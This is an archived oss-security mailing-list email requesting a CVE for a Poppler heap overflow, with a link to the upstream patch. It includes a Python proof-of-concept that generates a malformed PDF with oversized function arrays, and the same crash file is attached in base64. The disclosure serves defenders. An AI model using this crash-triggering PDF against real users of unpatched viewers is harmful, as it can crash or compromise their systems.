X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9535" "Monday" "11" "April" "2016" "20:52:27" "-0300" "Felipe" "felipe.andres.manzano@gmail.com" "<CAEDLTO9PTJy54Wqbb3c63phUbv5xCKJHkueNfFKtb0hy6VxpVQ@mail.gmail.com>" "217" "[oss-security] CVE request: Poppler < 0.40.0" nil nil nil "4" "2016041123:52:27" "[oss-security] CVE request: Poppler < 0.40.0" (number mark "U       felipe.andre Apr 11  217/9535  " thread-indent "\"[oss-security] CVE request: Poppler < 0.40.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 4033 invoked by uid 550); 12 Apr 2016 03:21:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24419 invoked from network); 11 Apr 2016 23:52:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to;
        bh=8KsxvVZIddUZDBwu0y85BqUELCADjzYVYqfRBrxccBo=;
        b=SmGv9reEZAFdSp2eJ06ShNBRQFHWZHXesum3xp13c3mEBE/oTEzO0OxDJ2HD1EB1dN
         Y9uJFz2dRIki61tGhbsrTR2jaYReAlCkhgRGxG5vyIBi3WB8ATK6EBw4Q4xDvIhNRYiy
         kpgeYGGZ6jPuWi4L9Q0MwN9Ha2xCsRFRbc8mmbAMyuvNVswTb/i77YhCXmgQUvwghv6n
         dPB0Ngsd7NDdV7f0hIIfRi2snVnlivVvgfnI8dDAFFVR5IwRVrekz6PctgNTZoiDraE6
         eF0512w5zAiYM8NfmWCmGpfytmINnJ0oCrVP2SxFx1F+ZsPA9DoDeETt84cn46sXb3rj
         OmTQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
        bh=8KsxvVZIddUZDBwu0y85BqUELCADjzYVYqfRBrxccBo=;
        b=jnsjr2W5Uua9U7ThXxGlgmbkVhKKyXWviGN/aj86nIoEZ0QOc5++TNwN6zL+k97mg0
         PzIQDsLnHpuDwOfXg38mt34W1xVNBXU8t+9iARhWbsnGwriSDZg0kLMA8zAcd5NXUEEZ
         QlyB7I+jCUy/GjtnugyHaLzHEZOssholhTZW9DXmYLK4GwG5i4egDPafzYdiEw1DU9V4
         sqqk8nw53YV9Z6Qw2of6h45uS6xXAm6Zejb13OOocyK4ehZlaVDIlZR84GpvqNlsLnCc
         cRsecwU9t/WDlh4VQbf/KiKsgOkCUV0In0TfrzlV2km94m1+obgTQrNFc/yF3bnfCkQR
         gdWg==
X-Gm-Message-State: AOPr4FWFSSxiQY0MEHKRwO66MQKtnLmtKaAwOMRYEZJYpIILvTcN00cOF3ozfrHir70TBqF9f5myHfMiUf10sA==
MIME-Version: 1.0
X-Received: by 10.112.54.201 with SMTP id l9mr62483lbp.105.1460418747723; Mon,
 11 Apr 2016 16:52:27 -0700 (PDT)
Date: Mon, 11 Apr 2016 20:52:27 -0300
Message-ID: <CAEDLTO9PTJy54Wqbb3c63phUbv5xCKJHkueNfFKtb0hy6VxpVQ@mail.gmail.com>
From: Felipe <felipe.andres.manzano@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary=001a11c3a754ae9d8005303e3c42
Subject: [oss-security] CVE request: Poppler < 0.40.0

--001a11c3a754ae9d8005303e3c42
Content-Type: multipart/alternative; boundary=001a11c3a754ae9d7b05303e3c40

--001a11c3a754ae9d7b05303e3c40
Content-Type: text/plain; charset=UTF-8

This is a clean heap overflow. Lib is used in evince and okular and for
preview in nautilus. Versions pre 0.40.0 are vulnerable.

The patch:
https://cgit.freedesktop.org/poppler/poppler/commit/?id=b3425dd3261679958cd56c0f71995c15d2124433


A crashy pdf file is attached.

PoC.py
from miniPDF.miniPDF import *
#from miniPDF.miniPDFO import *
import zlib
#The document
doc = PDFDoc()

#font
font = PDFDict()
font.add("Name", PDFName("F1"))
font.add("Subtype", PDFName("Type1"))
font.add("BaseFont", PDFName("Helvetica"))

#name:font map
fontname = PDFDict()
fontname.add("F1",font)

#resources
resources = PDFDict()
resources.add("Font",fontname)


data = '''BT /F1 24 Tf 240 700 Td (Pedefe Pedefeito
endstream
endobj
obj 1 0
99
endobj
Pedefeon!) Tj
ET /GS3 gs'''
#contents
contentsDict = PDFDict()
contents= PDFStream({},data)


length = PDFNum(len(data))
doc.add(length)
contents.add('Length',PDFRef(length))
#page
page = PDFDict()
page.add("Type",PDFName("Page"))
page.add("Resources",resources)
page.add("Contents", PDFRef(contents))

#pages
pages = PDFDict()
pages.add("Type", PDFName("Pages"))
pages.add("Kids", PDFArray([PDFRef(page)]))
pages.add("Count", PDFNum(1))

#add parent reference in page
page.add("Parent",PDFRef(pages))


#catalog
catalog = PDFDict()
catalog.add("Type", PDFName("Catalog"))
catalog.add("Pages", PDFRef(pages))

doc.add([catalog,pages,page,contents])
doc.setRoot(catalog)


#The Function thing
function = PDFDict()
function.add("FunctionType",PDFNum(2))
function.add("Domain",PDFArray([0,1]))
function.add("N",PDFNum(100))
#2261634.5098039214
size = 10000000
function.add("C0",PDFArray([2261634.5098039214]*size))
function.add("C1",PDFArray([2261634.5098039214]*size))


extgstate = PDFDict()
extgstate.add("Type",PDFName("ExtGState"))
extgstate.add("TR",function)

resources.add("ExtGState","<< /GS3 "+str(extgstate)+">>")

print doc

--001a11c3a754ae9d7b05303e3c40
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div id=3D":1w2" class=3D"" style=3D"font-size:12.8px;marg=
in-bottom:0px;margin-left:0px;padding-bottom:5px"><div id=3D":1w1" class=3D=
""><div dir=3D"ltr"><div>This is a clean heap overflow. Lib is used in evin=
ce and okular and for preview in nautilus. Versions pre 0.40.0 are vulnerab=
le.</div><div><br></div><div>The patch:</div><div><a href=3D"https://cgit.f=
reedesktop.org/poppler/poppler/commit/?id=3Db3425dd3261679958cd56c0f71995c1=
5d2124433" target=3D"_blank">https://cgit.freedesktop.org/poppler/poppler/c=
ommit/?id=3Db3425dd3261679958cd56c0f71995c15d2124433</a><br></div><div><br>=
</div><div><br></div><div><div>A crashy pdf file is attached.<br></div><div=
><br></div></div><div>PoC.py</div><div><div>from miniPDF.miniPDF import *</=
div><div>#from miniPDF.miniPDFO import *</div><div>import zlib</div><div>#T=
he document</div><div>doc =3D PDFDoc()</div><div><br></div><div>#font</div>=
<div>font =3D PDFDict()</div><div>font.add(&quot;Name&quot;, PDFName(&quot;=
F1&quot;))</div><div>font.add(&quot;Subtype&quot;, PDFName(&quot;Type1&quot=
;))</div><div>font.add(&quot;BaseFont&quot;, PDFName(&quot;Helvetica&quot;)=
)</div><div><br></div><div>#name:font map</div><div>fontname =3D PDFDict()<=
/div><div>fontname.add(&quot;F1&quot;,font)</div><div><br></div><div>#resou=
rces</div><div>resources =3D PDFDict()</div><div>resources.add(&quot;Font&q=
uot;,fontname)</div><div><br></div><div><br></div><div>data =3D &#39;&#39;&=
#39;BT /F1 24 Tf 240 700 Td (Pedefe Pedefeito=C2=A0</div><div>endstream</di=
v><div>endobj</div><div>obj 1 0</div><div>99</div><div>endobj</div><div>Ped=
efeon!) Tj=C2=A0</div><div>ET /GS3 gs&#39;&#39;&#39;</div><div>#contents</d=
iv><div>contentsDict =3D PDFDict()</div><div>contents=3D PDFStream({},data)=
</div><div><br></div><div><br></div><div>length =3D PDFNum(len(data))</div>=
<div>doc.add(length)</div><div>contents.add(&#39;Length&#39;,PDFRef(length)=
)</div><div>#page</div><div>page =3D PDFDict()</div><div>page.add(&quot;Typ=
e&quot;,PDFName(&quot;Page&quot;))</div><div>page.add(&quot;Resources&quot;=
,resources)</div><div>page.add(&quot;Contents&quot;, PDFRef(contents))</div=
><div><br></div><div>#pages</div><div>pages =3D PDFDict()</div><div>pages.a=
dd(&quot;Type&quot;, PDFName(&quot;Pages&quot;))</div><div>pages.add(&quot;=
Kids&quot;, PDFArray([PDFRef(page)]))</div><div>pages.add(&quot;Count&quot;=
, PDFNum(1))</div><div><br></div><div>#add parent reference in page</div><d=
iv>page.add(&quot;Parent&quot;,PDFRef(pages))</div><div><br></div><div><br>=
</div><div>#catalog</div><div>catalog =3D PDFDict()</div><div>catalog.add(&=
quot;Type&quot;, PDFName(&quot;Catalog&quot;))</div><div>catalog.add(&quot;=
Pages&quot;, PDFRef(pages))</div><div><br></div><div>doc.add([catalog,pages=
,page,contents])</div><div>doc.setRoot(catalog)</div><div><br></div><div><b=
r></div><div>#The Function thing</div><div>function =3D PDFDict()</div><div=
>function.add(&quot;FunctionType&quot;,PDFNum(2))</div><div>function.add(&q=
uot;Domain&quot;,PDFArray([0,1]))</div><div>function.add(&quot;N&quot;,PDFN=
um(100))</div><div>#2261634.5098039214</div><div>size =3D 10000000</div><di=
v>function.add(&quot;C0&quot;,PDFArray([2261634.5098039214]*size))</div><di=
v>function.add(&quot;C1&quot;,PDFArray([2261634.5098039214]*size))</div><di=
v><br></div><div><br></div><div>extgstate =3D PDFDict()</div><div>extgstate=
.add(&quot;Type&quot;,PDFName(&quot;ExtGState&quot;))</div><div>extgstate.a=
dd(&quot;TR&quot;,function)</div><div><br></div><div>resources.add(&quot;Ex=
tGState&quot;,&quot;&lt;&lt; /GS3 &quot;+str(extgstate)+&quot;&gt;&gt;&quot=
;)</div><div><br></div><div>print doc</div><div><br></div><div class=3D""><=
/div></div></div></div></div><div class=3D"" id=3D":1wg" style=3D"font-size=
:12.8px"></div></div>

--001a11c3a754ae9d7b05303e3c40--

--001a11c3a754ae9d8005303e3c42
Content-Type: application/x-gzip; name="crash.pdf.gz"
Content-Disposition: attachment; filename="crash.pdf.gz"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_imwnombv0

H4sICOM4DFcCA2NyYXNoLnBkZgDt0M9O41YUB+C9n+J0gdQuOrbzb4KEWAwD
VGrVoiQ7xMIQQ4PARompoC/ZRR+iD9AX6HUCw1Ssqm6/yLnOd+75ndh37+zz
yfflh2G299fff/yZlVFEe3mblcUwq5tl/3PwUjo4yBfPD3XkR1VX3bU3kZ9V
N/Umhml/FoeHr/3Dt/6j9rHpooz8x9VyE+ejvvMiXsbs0m+50VvurFrXKbib
/FV7+u+26dLWJsa7vVm9aR/XV2lQih0/dafzrurqhMhP58O+uJj16+f2vlo1
cV5EmR7gqIjzwWBSToajD+NifxoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw33AR+cljc9Wt2mbx
/FDHIPKjMs6dDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAwP/AReQ/R1kUcXgY+eL5oY78+Kk7nXdV
V6daXz1pmy4ODvKTsl8/VZt6W8l/qO9+q7vVVRX5/PGy22b7CWUaWd0npEDK
v15Z3Szby9tsHEX09zTrp7q56X6NMlVmfcemW9fVffZpsc0ORrG4TmsRH9Pz
LZbx7Vm9rK/r2N1WXRv9zJfQy/T07edl+/uvlV1323zzXSxuIztOw0/nw7jZ
vA8/revrrIhJVnz5xGQ8Ho7jOr7UyvQC253mrTYcva9NB+9q5XD679r+dDoZ
fZXt1tXqrl73ZzNr2y4G25PJ56vf65jsTqhad9vHTNGP6SX39o5/Ocn+ARMV
4ec4Fw8A

--001a11c3a754ae9d8005303e3c42--
